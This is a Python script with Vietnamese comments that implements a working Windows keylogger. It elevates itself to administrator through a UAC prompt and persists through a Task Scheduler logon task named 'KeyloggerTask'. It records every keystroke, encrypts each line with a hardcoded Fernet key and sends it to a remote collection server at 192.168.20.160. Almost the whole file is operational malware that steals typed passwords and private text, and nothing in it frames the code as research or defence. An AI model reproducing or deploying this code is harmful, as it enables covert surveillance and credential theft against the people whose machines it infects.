import os
import sys
import subprocess
import ctypes
import time
import keyboard
import requests
import base64
from cryptography.fernet import Fernet

# Khóa mã hóa Fernet (32 bytes base64-url-safe encoded string)
encryption_key = b'X9w43Qkdw3439fkeudkjd9kXnFAk3FxpdCQq0J1kWxs='
cipher_suite = Fernet(encryption_key)

# URL của server để nhận log
server_url = 'http://192.168.20.160:5000/log'  # Địa chỉ server mà bạn muốn gửi log

# Danh sách để lưu trữ các chuỗi ký tự được nhập
input_buffer = []

def is_admin():
    """Kiểm tra xem chương trình có đang chạy với quyền admin không."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Yêu cầu chạy lại chương trình với quyền admin nếu không có quyền admin."""
    if not is_admin():
        print("Yêu cầu quyền admin để thực thi chương trình.")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def send_encrypted_log(log):
    """Mã hóa log và gửi đến server dưới dạng form data."""
    encrypted_log = cipher_suite.encrypt(log.encode('utf-8'))
    log_data = {'log': base64.urlsafe_b64encode(encrypted_log).decode('utf-8')}  # Tạo form data

    try:
        response = requests.post(server_url, data=log_data)  # Gửi dưới dạng form data
        if response.status_code == 200:
            print("Log đã được gửi thành công.")
        else:
            print(f"Lỗi khi gửi log: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Lỗi kết nối đến server: {e}")

def on_key_press(event):
    """Xử lý khi một phím được bấm."""
    key = event.name

    # Thêm phím vào buffer
    if key != 'enter':  # Không thêm khi nhấn phím Enter
        input_buffer.append(key)
    else:  # Khi nhấn phím Enter, gửi dữ liệu
        log = ''.join(input_buffer)
        if log:  # Chỉ gửi nếu có dữ liệu
            send_encrypted_log(log)
            input_buffer.clear()  # Xóa buffer sau khi gửi

def start_keylogger():
    """Khởi động keylogger để theo dõi phím bấm."""
    print("Keylogger đang chạy...")
    keyboard.on_press(on_key_press)
    
    # Vòng lặp để giữ chương trình chạy
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("Đã dừng keylogger.")

def create_task():
    """Tạo task trong Task Scheduler để tự động chạy chương trình khi đăng nhập."""
    task_name = "KeyloggerTask"
    script_path = os.path.abspath(sys.argv[0])

    # Kiểm tra xem đường dẫn file có tồn tại không
    if not os.path.exists(script_path):
        print(f"Đường dẫn tệp không tồn tại: {script_path}")
        return

    # Câu lệnh tạo Task Scheduler
    command = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /rl highest /f'

    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Tác vụ '{task_name}' đã được tạo thành công trong Task Scheduler.")
    except subprocess.CalledProcessError as e:
        print(f"Lỗi khi tạo tác vụ: {e}")

    # Kiểm tra nếu task đã được tạo thành công
    verify_task_command = f'schtasks /query /tn "{task_name}"'
    result = subprocess.run(verify_task_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode == 0:
        print(f"Tác vụ '{task_name}' đã được xác nhận tạo thành công.")
    else:
        print(f"Lỗi khi kiểm tra tác vụ: {result.stderr.decode()}")

if __name__ == "__main__":
    run_as_admin()  # Đảm bảo chương trình chạy với quyền admin
    create_task()  # Tạo tác vụ trong Task Scheduler để tự động chạy khi đăng nhập
    start_keylogger()  # Khởi động keylogger ngay lập tức
